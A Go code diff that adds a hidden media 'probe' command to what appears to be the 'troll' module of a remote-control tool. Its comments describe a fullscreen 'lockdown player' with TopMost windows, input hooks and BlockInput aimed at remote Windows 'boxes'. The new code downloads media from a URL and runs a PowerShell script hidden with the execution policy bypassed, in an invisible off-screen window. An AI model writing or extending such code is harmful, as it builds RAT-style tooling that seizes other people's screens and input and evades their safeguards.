@@ -406,6 +406,112 @@ func trollStatus() (string, error) {
 	return sb.String(), nil
 }
 
+// trollProbe opens media headless (invisible window, no input block, no
+// lockdown) and reports what Media Foundation thinks: dimensions,
+// duration, audio/video presence, or the exact failure. Diagnostic for
+// "black screen" boxes: separates file/codec problems (FAILED/TIMEOUT
+// here too) from lockdown-player problems (probe opens, player doesn't).
+func trollProbe(arg string) (string, error) {
+	if runtime.GOOS != "windows" {
+		return "", fmt.Errorf("not supported on %s", runtime.GOOS)
+	}
+	src := strings.TrimSpace(arg)
+	if src == "" {
+		return "", fmt.Errorf("usage: troll-probe <path|url>")
+	}
+	local := src
+	if strings.HasPrefix(src, "http://") || strings.HasPrefix(src, "https://") {
+		dl, err := downloadTroll(src)
+		if err != nil {
+			return "", fmt.Errorf("troll download failed: %w", err)
+		}
+		local = dl
+	}
+	st, err := os.Stat(local)
+	if err != nil {
+		return "", fmt.Errorf("troll media not found: %s", local)
+	}
+	ext := strings.ToLower(filepath.Ext(local))
+	if trollExtKind(ext) == "" {
+		return "", fmt.Errorf("unsupported troll media type %q", ext)
+	}
+	var sb strings.Builder
+	fmt.Fprintf(&sb, "probe %s\nsize=%d\n", filepath.Base(local), st.Size())
+	if ext == ".mp4" || ext == ".m4v" || ext == ".mov" {
+		if c := sniffMP4Codec(local); c != "" {
+			fmt.Fprintf(&sb, "codec=%s\n", c)
+		}
+	}
+	if trollImageExts[ext] {
+		if err := validateTrollImage(local, ext); err != nil {
+			fmt.Fprintf(&sb, "still=INVALID (%v)\n", err)
+			return sb.String(), nil
+		}
+		fmt.Fprintf(&sb, "still=valid %s header\n", ext)
+		return sb.String(), nil
+	}
+	script, err := trollProbeScript(local)
+	if err != nil {
+		return "", err
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	out, err := runHidden(ctx, "powershell", []string{"-NoProfile", "-ExecutionPolicy", "Bypass", "-command", script}...)
+	_ = err // verdict parsed from stdout; exec errors surface as no PROBE-RESULT
+	for _, ln := range strings.Split(string(out), "\n") {
+		if strings.HasPrefix(strings.TrimSpace(ln), "PROBE-RESULT:") {
+			sb.WriteString(strings.TrimSpace(ln) + "\n")
+			return sb.String(), nil
+		}
+	}
+	raw := strings.TrimSpace(string(out))
+	if len(raw) > 500 {
+		raw = raw[:500] + "..."
+	}
+	return sb.String() + "PROBE-RESULT: no verdict (player died silently). raw=" + raw + "\n", nil
+}
+
+// trollProbeScript: invisible 2px off-screen window hosting a MediaElement.
+// No TopMost, no hook, no BlockInput — pure capability check.
+func trollProbeScript(path string) (string, error) {
+	q := psQuote(path)
+	return fmt.Sprintf(`Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName PresentationCore
+$uri = (New-Object System.Uri(%s)).AbsoluteUri
+$w = New-Object System.Windows.Window
+$w.Width = 2; $w.Height = 2; $w.Left = -10000; $w.Top = -10000
+$w.WindowStyle = 'None'; $w.ShowInTaskbar = $false
+$w.Opacity = 0; $w.ShowActivated = $false
+$me = New-Object System.Windows.Controls.MediaElement
+$me.Source = $uri
+$me.LoadedBehavior = 'Manual'
+$me.UnloadedBehavior = 'Manual'
+$w.Content = $me
+$script:verdict = ''
+$me.Add_MediaOpened({
+  $script:verdict = ('OPENED video={0}x{1} dur={2} hasAudio={3} hasVideo={4}' -f $me.NaturalVideoWidth, $me.NaturalVideoHeight, $me.NaturalDuration, $me.HasAudio, $me.HasVideo)
+  $w.Close()
+})
+$me.Add_MediaFailed({
+  param($s,$e)
+  $msg = 'unknown media error'
+  if ($e -and $e.ErrorException) { $msg = $e.ErrorException.Message }
+  $script:verdict = 'FAILED: ' + $msg
+  $w.Close()
+})
+$pt = New-Object System.Windows.Threading.DispatcherTimer
+$pt.Interval = New-Object TimeSpan(0,0,0,12,0)
+$pt.Add_Tick({
+  $pt.Stop()
+  if ($script:verdict -eq '') { $script:verdict = 'TIMEOUT (no MediaOpened/MediaFailed in 12s)' }
+  $w.Close()
+})
+$pt.Start()
+$app = New-Object System.Windows.Application
+[void]$app.Run($w)
+Write-Output ('PROBE-RESULT: ' + $script:verdict)`, q), nil
+}
+
 // trollScript builds the lockdown player. Branch on media kind:
 //   - video extensions → WPF MediaElement fullscreen loop
 //   - gif/png/jpg/bmp → WinForms frame animator / static Image
